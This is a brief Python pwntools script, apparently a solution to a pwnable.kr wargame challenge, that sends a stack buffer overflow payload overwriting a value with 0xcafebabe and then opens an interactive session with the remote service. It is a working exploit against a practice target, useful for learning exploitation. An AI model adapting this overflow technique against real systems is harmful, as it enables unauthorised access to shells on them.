from pwn import *
context.log_level = 'debug'
conn =  remote('pwnable.kr',9000)
p = 'a'*0x2c 
p += 'b'*4 
p += 'c'*4
p += p32(0xcafebabe)

conn.sendline(p)
conn.interactive()
